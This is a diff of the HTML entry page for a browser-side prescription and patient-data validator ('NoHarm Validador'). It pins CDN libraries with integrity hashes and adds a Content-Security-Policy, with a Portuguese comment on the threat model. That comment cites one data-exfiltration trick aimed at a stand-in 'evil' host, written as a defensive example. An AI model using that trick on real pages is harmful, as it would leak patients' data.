@@ -3,26 +3,107 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <!--
+      O validador le dado de paciente. Entao:
+
+      1. As libs de terceiro vem com VERSAO PINADA e `integrity` (SRI). Sem
+         isso, um comprometimento do CDN (ou uma versao nova publicada com
+         codigo malicioso) rodaria com acesso total a pagina — e a pagina tem
+         prescricao e paciente em memoria. Com SRI o browser se recusa a
+         executar se o byte mudar.
+      2. O CSP fecha a SAIDA, que e o que importa aqui:
+           - `connect-src 'self'`  -> nenhum fetch/XHR/WebSocket/beacon para
+                                      fora. E a defesa principal: sem isso um
+                                      script comprometido manda a prescricao
+                                      para onde quiser.
+           - `img-src 'self' data:` -> fecha o truque de exfiltrar via
+                                      `new Image().src = 'evil?dado='`.
+           - `script-src` com origem unica -> nada de script de outro dominio.
+           - `object-src`/`base-uri`/`form-action 'none'`.
+
+         O que este CSP NAO protege: `unsafe-eval` e `unsafe-inline` em
+         script-src sao obrigatorios porque o Babel compila o JSX no browser e
+         injeta o resultado como script inline (sem build step, regra do
+         projeto). Logo, ele nao defende contra injecao de script na pagina —
+         defende contra o script levar o dado embora. Hoje nao ha vetor de
+         injecao (nenhum `innerHTML`/`eval` sobre dado do cliente), e quem
+         fechar o `unsafe-eval` um dia precisa primeiro tirar o Babel do
+         browser.
+         `unsafe-inline` em style-src e porque o AntD injeta <style> em
+         runtime.
+
+      Para atualizar uma lib: mude a versao, recalcule o hash e troque os dois.
+          curl -sL <url> | openssl dgst -sha384 -binary | openssl base64 -A
+    -->
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               script-src 'self' 'unsafe-eval' 'unsafe-inline' https://cdn.jsdelivr.net;
+               style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
+               img-src 'self' data:;
+               font-src 'self' data:;
+               connect-src 'self';
+               object-src 'none';
+               base-uri 'none';
+               form-action 'none'"
+    />
     <title>NoHarm Validador</title>
     <link rel="icon" href="imgs/favicon.ico" />
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/antd@5/dist/reset.css" />
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/antd@5/dist/antd.min.css" />
-    <link rel="stylesheet" href="styles.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/antd@5.29.3/dist/reset.css"
+      integrity="sha384-g9YEh+RjaBJZE0/1Z3yIWpIIwOHnZZ+BtoA4WN+ZrLCbvTY0V87/eZUnhvRanu6D"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="styles.css?v=45" />
+    <link rel="stylesheet" href="noharm-ui.css?v=45" />
   </head>
   <body>
     <div id="root"></div>
 
-    <script src="https://cdn.jsdelivr.net/npm/react@18/umd/react.development.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/react-dom@18/umd/react-dom.development.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/dayjs@1/dayjs.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/antd@5/dist/antd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@ant-design/icons@5/dist/index.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/papaparse@5.4.1/papaparse.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@babel/standalone/babel.min.js"></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/react@18.3.1/umd/react.development.js"
+      integrity="sha384-hD6/rw4ppMLGNu3tX5cjIb+uRZ7UkRJ6BPkLpg4hAu/6onKUg4lLsHAs9EBPT82L"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/react-dom@18.3.1/umd/react-dom.development.js"
+      integrity="sha384-u6aeetuaXnQ38mYT8rp6sbXaQe3NL9t+IBXmnYxwkUI2Hw4bsp2Wvmx4yRQF1uAm"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/dayjs@1.11.21/dayjs.min.js"
+      integrity="sha384-1Ft4/JTNbt7S/44V0himpcjx+YfQ1a6W6SYBJMr94ba6jwZhWoWoLaZsMmtJILgq"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/antd@5.29.3/dist/antd.min.js"
+      integrity="sha384-SOLuE/G6SSyph6I2bGwlviWIiC0+MKVkmd/PFsDOA8yVaQnS0zLTSenRp3PznPXC"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/@ant-design/icons@5.6.1/dist/index.umd.min.js"
+      integrity="sha384-0EWwEDsIH8NINq/z7KdxJDjeP9rCWPurEK0BZnkfhKH9WQGpC8FPbOY0mDyOS2WU"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/papaparse@5.4.1/papaparse.min.js"
+      integrity="sha384-D/t0ZMqQW31H3az8ktEiNb39wyKnS82iFY52QPACM+IjKW3jDUhyIgh2PApRqJZs"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/@babel/standalone@8.0.6/babel.min.js"
+      integrity="sha384-rvzPMWNSnmV783PP2Xyo/KpoRFFeS2wlJ8NLsxYf/kfaAvTYPs+G1KjPrV0Gto0i"
+      crossorigin="anonymous"
+    ></script>
 
-    <script src="validator.js"></script>
-    <script src="storage.js"></script>
-    <script type="text/babel" src="wizard.js"></script>
-    <script type="text/babel" src="app.js"></script>
+    <script src="noharm-ui-icons.js?v=45"></script>
+    <script src="noharm-ui-exemplo.js?v=45"></script>
+    <script type="text/babel" src="noharm-ui.js?v=45"></script>
+
+    <script src="validator.js?v=45"></script>
+    <script src="storage.js?v=45"></script>
+    <script type="text/babel" src="wizard.js?v=45"></script>
+    <script type="text/babel" src="app.js?v=45"></script>
   </body>
 </html>
